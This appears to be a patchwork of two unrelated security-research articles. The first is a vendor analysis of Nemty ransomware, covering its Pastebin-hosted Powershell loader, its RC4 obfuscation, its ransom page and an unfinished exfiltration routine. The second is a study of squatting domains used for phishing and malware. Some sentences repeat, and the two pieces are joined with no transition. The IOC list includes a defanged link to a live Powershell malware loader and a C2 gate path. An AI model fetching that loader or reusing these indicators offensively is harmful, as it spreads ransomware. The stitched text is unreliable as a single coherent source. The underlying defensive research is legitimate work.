0	The first sample that we were able to analyze came from a link that was shared by the@BotySrtTwitter bot account, which posts Pastebin links leading to the Sodinokibi and Buran malware families.
0	Link that was supposed to lead to a Sodinokibi payload
0	The links lead to Powershell scripts that execute embedded malware payloads usingReflective PE Injection.
0	We collected the links that were tagged as Sodinokibi, expecting to extract samples of that ransomware.
0	However, as we were running our automation to extract the embedded binaries, we found an unsupported file, and as we investigated further, we discovered it was the new Nemty ransomware instead.
0	In our initial analysis of the ransomware, we found a link embedded in its binary which we are very familiar with.
0	It is a statement that was actually used by GandCrab when it was having its vaccine war with Ahnlab, as we detailed previously in our article discussing the evolution ofGandCrab v4.x.
0	The strings used throughout Nemtys execution are obfuscated using a combination of simple base64 encoding and RC4 encryption.
0	And to express their unsurprising animosity towards the security industry, this variant usef**kav\x00as its vulgar RC4 encryption key.
0	In fact, this may be the first time that we have seen a ransom malware use such a strong  albeit overkill and inefficient for its purpose  encryption algorithm to protect information.
0	In most cases, 2048 and 4096 key sizes are more than enough to secure any message.
0	Using the longer key size adds a large overhead due to significantly longer key generation and encryption times.
0	This is clearly an error, which implies that this malware may be in its early stages.
0	It also avoids files with specific extensions, as listed in the next image, although it is done in a very unusual and rather inefficient way using case-insensitive string comparison.
0	This is possibly an affiliate ID, which means that Nemty is possibly being sold as a Ransomware-as-a-Service (RaaS).
0	Nemtys Ransom Note and Payment Page
0	This is possibly an affiliate ID, which means that Nemty is possibly being sold as a Ransomware-as-a-Service (RaaS).
0	The payment page is hosted in the Tor network for anonymity, which has become a standard for ransomware operations.
0	To get to the main payment page, the victim must upload the encrypted configuration file and an encrypted file for a decryption test.
0	As of this writing, the threat actors are demanding $1000 in bitcoin in exchange for the decryption of the victims files.
0	There is a function to send the encrypted configuration to exfiltrate theconfigurationdata from the victims machine, although it clearly has not yet been practically implemented.
0	This is because the hardcoded IP address, which is supposed to be the threat actors C2 server, is actually the victim systems loopback address, 127.0.0.1.
0	It is possible that they simply have not configured an operational server to receive the data yet, which is another clue that this ransomware is still in the development stage.
0	The payment page supports the Russian language, which is very unusual and confusing.
0	Considering the embedded image with the Russian statement that was discussed later, it is easy to assume that the developers of Nemty are of Russian descent.
0	Normally, they would avoid infecting Russian users so as to not attract attention from authorities in their region.
0	However, this does not seem to be the case for this ransomware.
0	Despite that, however, in its current state, it can still carry out file encryption on a victims system, making it a real threat..
0	As of this writing, a new version of this malware has been found and is already being analyzed.
0	Fortinet customers are protected by the following:
0	Samples are detected by our W32/Gen.NVV!tr.ransom signature
0	FortiSandbox rates the malwares behavior as high risk
0	267a9dcf77c33a1af362e2080aaacc01a7ca075658beb002ab41e0712ffe066e (Nemty ransomware from Powershell) - W32/Gen.NVV!tr.ransom
0	hxxps://pastebin.com/raw/NE3TJ3z1 (link to the Powershell loader)
0	127.0.0.1:9050/public/gate?data={encrypted configuration}
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	We have also discussed several irregularities and inefficiencies in its code, implying that it is still in its early stage of development.
0	The purpose of squatting domains is to confuse users into believing that the targeted brands (such as Netflix) own these domain names (such as netflix-payments[.]com) or to profit from users typing mistakes (such as whatsalpp[.]com for WhatsApp).
0	While cybersquatting is not always malicious toward users, it is illegal in the U.S.,[1] and squatting domains are often used or repurposed for attacks.
0	The Palo Alto Networks squatting detector system discovered that 13,857 squatting domains were registered in December 2019, an average of 450 per day.
0	We found that 2,595 (18.59%) squatted domain names are malicious, often distributing malware or conducting phishing attacks, and 5,104 (36.57%) squatting domains we studied present a high risk to users visiting them, meaning they have evidence of association with malicious URLs within the domain or are utilizing bulletproof hosting.
0	We also ranked the Top 20 most abused domains in December 2019 based on adjusted malicious rate, which means that a domain is either a target of many squatting domains or most of these squatting domains are confirmed malicious.
0	We found that domain squatters prefer profitable targets, such as mainstream search engines and social media, financial, shopping and banking websites.
0	Malware distribution: A domain mimicking Samsung (samsungeblyaiphone[.]com) hosting Azorult malware to steal credit card information.
0	Command and control (C2): Domains mimicking Microsoft (microsoft-store-drm-server[.]com and microsoft-sback-server[.]com) attempting to conduct C2 attacks to compromise an entire network.
0	Re-bill scam: Several phishing sites mimicking Netflix (such as netflixbrazilcovid[.]com) set up to steal victims money by first offering a small initial payment for a subscription to a product like weight loss pills.
0	However, if users dont cancel the subscription after the promotion period, a much higher cost will be charged to their credit cards, usually $50-100.
0	Potentially unwanted program (PUP): Domains mimicking Walmart (walrmart44[.]com) and Samsung (samsungpr0mo[.]online) distributing PUP, such as spyware, adware or a browser extension.
0	Typosquatters intentionally register misspelled variants (such as whatsalpp[.]com) of target domain names (whatsapp[.]com) to profit from users typing mistakes or to deceive users into believing that they are visiting the correct target domain.
0	The most frequent typosquatting techniques include registering names one edit distance from the original domain, as these are the most common and overlooked mistakes users make.
0	For more information, readers can refer to academic research papers on the scale and malicious use of typosquatting.
0	Combosquatting is another widespread registration abuse that combines popular trademarks with words such as security, payment or verification.
0	Combosquatting domains like netflix-payments[.]com are often used in phishing emails, by scam websites and for social engineering attacks to convince users that they are visiting web content maintained by the targeted trademark.
0	Bitsquatting domains have a character that differs in one bit (such as micposoft[.]com) from the same character as the targeted legitimate domain (microsoft[.]com).
0	Bitsquatting can benefit attackers because a hardware error can cause a random bit-flip in memory where domain names are stored temporarily.
0	The average malicious rate of the 13,857 squatting domains is 18.59% (2,595) and the average suspicious rate is 36.57% (5,104).
0	Specifically, we studied popular registrars, name services, autonomous systems and certificate authorities used by domain squatters.
0	For each chart outlined below, we considered the number of squatting detections to reflect their popularity among domain squatters, and the malicious IOC rate to quantify the degree of threat to users.
0	Additionally, parkingcrew.net and above.com are popular parking services because they provide a simple monetization avenue to domain owners, achieved by pointing domain names DNS records to their name servers.
0	The top three most abused AS (19495, 48635, 262254) belong to the three most abused name service providers, respectively (freenom.com, registrar.eu, ddos-guard.net).
0	The fourth most abused AS (40034) is owned by ztomy.com, a service favored for DNS hijacking attacks.
0	In these campaigns, attackers set up hundreds of subdomains mimicking popular target domains under com-secure-login[.]info and com-finder-me[.]info.
